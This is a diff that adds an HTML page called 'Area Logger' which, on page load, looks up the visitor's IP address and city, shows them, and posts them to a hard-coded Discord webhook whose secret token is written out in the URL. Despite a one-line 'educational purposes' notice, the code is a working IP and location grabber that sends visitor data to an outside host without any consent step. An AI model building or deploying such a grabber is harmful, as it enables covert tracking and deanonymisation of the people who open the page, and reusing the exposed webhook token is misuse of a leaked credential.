@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Area Logger with Discord Webhook</title>
+  <script>
+    window.onload = function() {
+      // Fetch visitor's IP from external API
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+
+          // Fetch geolocation info for IP
+          fetch(`https://ipapi.co/${ip}/json/`)
+            .then(response => response.json())
+            .then(geo => {
+              // Show IP and location on page
+              const info = document.createElement('p');
+              info.innerHTML = `Your IP: <strong>${ip}</strong><br>` +
+                               `City: <strong>${geo.city}</strong><br>` +
+                               `Country: <strong>${geo.country_name}</strong>`;
+              document.body.appendChild(info);
+
+              // Send info to Discord webhook
+              fetch('https://discord.com/api/webhooks/1371115784205766816/8BenONajqNqFZNTNkOgx3lNInlJSxv9ML8Pz0jqcmjF60rzze8WzakoEampdxWSUKQBm', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  content: `Visitor IP: ${ip}\nCity: ${geo.city}\nCountry: ${geo.country_name}`
+                })
+              })
+              .then(() => console.log('Data sent to Discord webhook'))
+              .catch(() => console.log('Failed to send webhook'));
+            });
+        })
+        .catch(() => {
+          const p = document.createElement('p');
+          p.textContent = 'Could not retrieve your IP or location.';
+          document.body.appendChild(p);
+        });
+    };
+  </script>
+</head>
+<body>
+  <h1>Area Logger Test Page</h1>
+  <p>This page logs your IP and location to Discord (for educational purposes).</p>
+</body>
+</html>
